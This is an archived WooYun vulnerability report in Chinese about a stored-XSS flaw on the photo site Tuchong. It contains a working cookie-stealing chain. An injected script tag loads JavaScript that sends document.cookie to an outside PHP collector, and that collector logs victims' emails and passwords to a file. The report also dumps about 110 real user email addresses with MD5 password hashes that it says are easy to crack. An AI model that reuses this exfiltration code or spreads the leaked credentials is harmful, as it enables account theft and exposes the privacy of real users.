<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		图虫网帐户密码泄露高危啊。  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		图虫网帐户密码泄露高危啊。  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/_Evil">_Evil</a> 
</li><li>提交时间：		2012-08-26 16:00</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2012-08-26：	细节已通知厂商并且等待厂商处理中<br/>
									2012-08-31：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">其实我很想搞ajax继续传播,1传10,10传100的。 没有授权不敢。<br />
 <br />
剑心:漏洞要用数据说话的。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">http://yf-吗晒客.com/uploads/sb.txt<br />
<br />
</p><pre><code>email:kwspecial@gmail.com-password:88e519826c6e7f64ed83dd5f222cbf5b<br />
email:435420828@qq.com-password:0794fdd7a3f98153a04bfbd6b3ed2e4f<br />
email:435420828@qq.com-password:<br />
email:932502597@qq.com-password:0794fdd7a3f98153a04bfbd6b3ed2e4f<br />
email:372486983@qq.com-password:8983683b49b1e5117fa3775bd4ea8e71<br />
email:-password:<br />
email:ruixuanbai@gmail.com-password:538344bd3ab84ecf3b2a8257f4bfb69b<br />
email:cadenza91@sina.com-password:b56f2eaa47d7bafdd427fd833831564e<br />
email:421928578@qq.com-password:a1a4419eff3ca6dc2d3fa227d79f7382<br />
email:popoki@foxmail.com-password:59dbc0fa881406b3ab85826ba15712fe<br />
email:yutong180323@163.com-password:3821744b73566f2419fba2643d07a495<br />
email:rapfish@qq.com-password:4cdae08ec4b134593960e3bac693fc26<br />
email:2573417504@qq.com-password:e35f328b65afdf9c255216d37f2ec4ca<br />
email:63195888@qq.com-password:7531b9818a9085dd5aa269569a955d90<br />
email:dai_bigtree@263.net-password:1e077f0bf453bb351ccd20211c1f1c50<br />
email:hzwsy1991@163.com-password:08e55e7ddd48424cfba1c0f07cb0a5d9<br />
email:86073120@qq.com-password:1b30b7acdf6e5bf7ccb1a73e4a48839e<br />
email:futureworker@gmail.com-password:f24fcf42969d71912f79bc7ff3ed8051<br />
email:sq1022@gmail.com-password:4d7032fd1c3ee3d7054807a366d5c5ec<br />
email:s2x0f2@gmail.com-password:a1b69e9ee73f511993cf3f2bd4043080<br />
email:59961317@qq.com-password:ac115e77aedf3c2770aca540dbc4f842<br />
email:939923306@qq.com-password:09b22190be57d5de15a18a494034e91a<br />
email:jarber@yeah.net-password:9b1b83839625e011575b6728c1db7053<br />
email:871987430@qq.com-password:dd812a2d1b9e7bbc6fdaed46e64daa53<br />
email:vow7136@sina.com-password:c9145ec4c54a81d9e3279a13b27bf7ed<br />
email:304825493@qq.com-password:331c2679989ba11f2357a960bdc8601e<br />
email:orchidc@gmail.com-password:807c21c0b99b29c6de4f29c255906ee2<br />
email:ji.cao@live.com-password:8016a3012286645575ebe3a361a63459<br />
email:ji.cao@live.com-password:<br />
email:jiangpeng8424@gmail.com-password:dadf5c1b59ef532717f2b14c614fe727<br />
email:cnyouker@solidot.org-password:9bc3122074b40d9d9470ff893fdd4cc1<br />
email:siemendracula@163.com-password:2cf4efdd0eb20af9149cd2e65eeb06f7<br />
email:1527026511@qq.com-password:<br />
email:huajs1980@sina.com-password:2b479a243e91a3b070d2a5e4369cad13<br />
email:liyangrobben@vip.qq.com-password:258a4fa98d83e4776a5a0eca80312970<br />
email:ljc199077@163.com-password:23205959aa168add4bd1dc8616d470dd<br />
email:liupaocha@sina.com-password:1cfc8d22758737274d15c8ab4b5c5f9c<br />
email:443900198@qq.com-password:df0dbd3845c3bc79f1a979a9fa9dc426<br />
email:ayn715@hotmail.com-password:4c1070c7bdd8edc15f6b27d691b2a98b<br />
email:arsenalfanye@yeah.net-password:7d8b2544edf58c5aea5d45fbc6a6d59a<br />
email:autxlt@163.com-password:0ee5c42feab7c0f8295d393c49506582<br />
email:lynndodo@126.com-password:0f4137ed1502b5045d6083aa258b5c42<br />
email:circleyq@gmail.com-password:c19ac054c8a5c4e548e36383bd0b2ec7<br />
email:117261325@qq.com-password:5585a302921b70059a618ad06c365da3<br />
email:lhzzxa@gmail.com-password:b0567a2055f3bccc97a4ea3f27bce51b<br />
email:334928337@qq.com-password:dc4451d61415c741db8570c378ee2b1d<br />
email:chenhao7179@163.com-password:32c501c605a01b2b6b84cbe6dbcb7e64<br />
email:liujunyan5615@gmail.com-password:6e528ea73c3efb6a4bdd836fd017b427<br />
email:836912795@qq.com-password:064f08d4a4ab5f9025698803ebd98954<br />
email:289821127@qq.com-password:da95860a9dde291249a0a02b90255962<br />
email:449255721@qq.com-password:32186824cc871688d94a0f69f1fff996<br />
email:349881438@qq.com-password:0bb507d15ef53588d995f10011a8163b<br />
email:zlinetony@163.com-password:2eaea49f993994eee87171bdafce87be<br />
email:nick_out@msn.com-password:82ee378cb20fe94bcff7d01df363b216<br />
email:chulian198563@sina.com-password:b7569e7388e663a1512050218c66d08a<br />
email:15117968@qq.com-password:ee606053902dd7741d5bd46f7de2b53d<br />
email:1409321237@qq.com-password:fbbdc876f33d97146ceda5af1d31772a<br />
email:244891344@qq.com-password:945609558c8a3995bf2030d30e2f310e<br />
email:13822527722@139.com-password:8b471d2c07b2537791d6234d64ddee2b<br />
email:356255531@qq.com-password:db88ae12e02d23c4e2f484aee768748c<br />
email:jjjabc123@gmail.com-password:32546b751eb75ce027f0197f695e2f98<br />
email:934271474@qq.com-password:b9bf338cfff10644a7708c8ce1d9ed12<br />
email:360962152@qq.com-password:868ab18969d3f8b59c8671777f93730f<br />
email:fxxkmsn@gmail.com-password:ac886f6f68837c4f909e56c412388285<br />
email:314739532@qq.com-password:4404e8a76f6835e97d6db0fedd103482<br />
email:daleq1118@hotmail.com-password:58963df817d4f28741b3c558f377b67d<br />
email:fatjun@gmail.com-password:28331f55541279ef8950c15d16c8bdcd<br />
email:275240479@qq.com-password:25d73c271c1dd95c54cfca9bfe3d9dfe<br />
email:leegook@gmail.com-password:da08ee40511ad8854810365411e2269e<br />
email:liuxv_123456789@163.com-password:b17301d76ac092e7b32a3083f74585a4<br />
email:csy0093@sina.com-password:08ca9c5d74bf28887cbe62ae4242479f<br />
email:cadenza91@sina.com-password:<br />
email:1580110524@qq.com-password:92e803b2ae9581ee9a65a5bd08aac1b1<br />
email:blueinsky_lee@hotmail.com-password:bbefeba062f816d0c68bb6b757f54f28<br />
email:spiolynn@yahoo.cn-password:ba065b1e6e716746d83dd76392262ce4<br />
email:andyzhang87@gmail.com-password:be9072eec6d7b4030d24712403cb549f<br />
email:48971903@qq.com-password:78296ae4f312544e530eea6260b7983e<br />
email:kai_e@yahoo.cn-password:8fef3f36f2d0e69a01b670511aa3d4f4<br />
email:cao91peng@126.com-password:2309275ac43161f935b00029743c753d<br />
email:crazylinhui@163.com-password:9643f71b3067a01dc7f3845719535482<br />
email:29865567@qq.com-password:1cd341f93d7147a4bda6d2eac899fe1d<br />
email:583066798@qq.com-password:8d94c6fa8db4ad63921820c6914bc66a<br />
email:onlyzeiss@sina.cn-password:e24f4383920303ed47c71206d221085a<br />
email:cqw1128@gmail.com-password:13cebba6d1bb0e3e70d289ff0fe4668a<br />
email:yanzi66@hotmail.com-password:0747976ce03d81883551da99c2346b8b<br />
email:123093299@qq.com-password:7e759aa4804fbf540b9d3a6f9cbad2b4<br />
email:118104512@qq.com-password:3c1b8a0137db234f18c9b6dd2a37ce5d<br />
email:lxmouseustc@163.com-password:317204bbb3b70c97e61d9af7b471f28e<br />
email:406836126@qq.com-password:60557c6d0518db7fbba41a392b63d114<br />
email:titanhu@qq.com-password:e7ee70e3c2f0986271eb5699693ac339<br />
email:manxiao@vip.qq.com-password:db5efa0d7f411deb0183ebaf4b1f7c14<br />
email:xia.dongdong@163.com-password:e0584e5ca01caea7c47c077978f88ce2<br />
email:maple_zhifeng@yahoo.co.jp-password:e9086f624f5f1b754aaa11e6eff4c3b3<br />
email:278415914@qq.com-password:ddd42eea9f20e367ca6ab435fcada586<br />
email:mhxy13@gmai.com-password:437134ebf5f68fadd04121ce5a984bc5<br />
email:181034780@qq.com-password:b78c98c650a008018e1503b38d6f3ff7<br />
email:30601@qq.com-password:<br />
email:dinuodefangjian@163.com-password:6b3df585bc316bf93ad05421feed7fb7<br />
email:yanhou_liu@yahoo.com.cn-password:6c7dfe6096c793bfe593ec66dcb4ffb6<br />
email:yzhou118@gmail.com-password:929e565875f0ff0216b35b26b64e09f8<br />
email:lwkdota@qq.com-password:f3228715d5025ec342e95280e0f7248b<br />
email:1255163139@qq.com-password:bbd11c7b6666e8b9fb638a69baad0672<br />
email:hndingkai@sina.com-password:da3e7686e6d2bd6916c20bb911f90b77<br />
email:liujianzhao@live.cn-password:33814acc0b112f9c4a7d49a407321729<br />
email:1207397812@qq.com-password:2a42591722571f604899f3c1cc657ca0<br />
email:niubi@asu.edu-password:1d1208991fe6d3af56e59c8b6f58d466<br />
email:wz1758@163.com-password:06d2905af95979811ca987e3a7fdcb91<br />
email:qianyu_wu@qq.com-password:cddea3b3655d9a56838e09c89a1ec741<br />
email:shuanglingcom@hotmail.com-password:864752e55a1618c73fbea27df9221181<br />
email:shuanglingcom@hotmail.com-password:<br />
email:573724007@qq.com-password:22638a3131d0f0a7346b178fd29f939c</code></pre><p class='detail'><br />
<br />
<br />
<br />
密码是md5解密就行了。 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>&lt;html&gt;<br />
&lt;head&gt;&lt;title&gt;90sec/title&gt;<br />
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />
&lt;style type=&quot;text/css&quot;&gt;<br />
body{<br />
background-image:url(http://forum.90sec.org/images/default/logo.gif);<br />
background-attachment:fixed;<br />
background-repeat:no-repeat;<br />
background-color:#AFAFAF;<br />
background-position:50% 50%;<br />
}<br />
&lt;/style&gt;<br />
&lt;/head&gt;<br />
&lt;body&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
&lt;?php<br />
$cookie = $_GET[&#039;c&#039;];<br />
get_pwd_and_email($cookie);<br />
function get_pwd_and_email($cookie)<br />
{	$get = array();<br />
	if (!empty($cookie))<br />
	{<br />
		$cookie = strtr($cookie,&quot;; &quot;,&quot;&amp;&quot;);<br />
		parse_str($cookie,$get);<br />
	    if(isset($get[&#039;email&#039;])) $a=$get[&#039;email&#039;];<br />
	    if(isset($get[&#039;password&#039;]))  $b=$get[&#039;password&#039;];<br />
		$c=&quot;email:$a-password:$b&quot;;<br />
		//echo &quot;$c&quot;;<br />
		$password_list=file(&#039;E:/vhost/wwwroot/vhost1329816067000/www/uploads/sb.txt&#039;);<br />
		if(in_array(&quot;$c\r\n&quot;,$password_list))<br />
		{break;}else{<br />
		$fp=@fopen(&#039;E:/vhost/wwwroot/vhost1329816067000/www/uploads/sb.txt&#039;,&#039;a&#039;);<br />
		@fwrite($fp,$c.&quot;\r\n&quot;);<br />
		@fclose($fp);<br />
		}<br />
	}<br />
}<br />
?&gt;</code></pre><p class='detail'><br />
<br />
<br />
<br />
利用外部调用js:<br />
<br />
</p><pre><code>&lt;script/src=//xxxxx/1.js&gt;</code></pre><p class='detail'><br />
<br />
<br />
<br />
1.js代码<br />
<br />
</p><pre><code>&lt;iframe id=&quot;rc&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;&lt;script&gt;document.getElementById(&quot;rc&quot;).src=&quot;http://xxx/SBzhu1.php?c=&quot;+document.cookie;&lt;/script&gt;</code></pre><p class='detail'><br />
<br />
<br />
<br />
感谢 90sec核心 L.N帮忙优化php代码。测试没恶意,请不要介意。 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">http://www.wooyun.org/corps/%E5%9B%BE%E8%99%AB%E7%BD%91 去看看我发你的漏洞,认真修复<br />
<br />
<br />
<br />
<br />
<br />
下。 哎。。。。。。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/_Evil" title="_Evil">_Evil</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011372" title="图虫网帐户密码泄露高危啊。">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：无影响厂商忽略</p>
													<p class="detail">忽略时间：2012-08-26 16:00</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail"></p>
											

					
					
					<h3 class="detailTitle">最新状态：</h3>

																	<p class="detail">2012-09-01：我之前没收到邮件阿.</p>
											

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="11372";
var bugRating="-3";
var myRating="";
var ratingCount="1";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
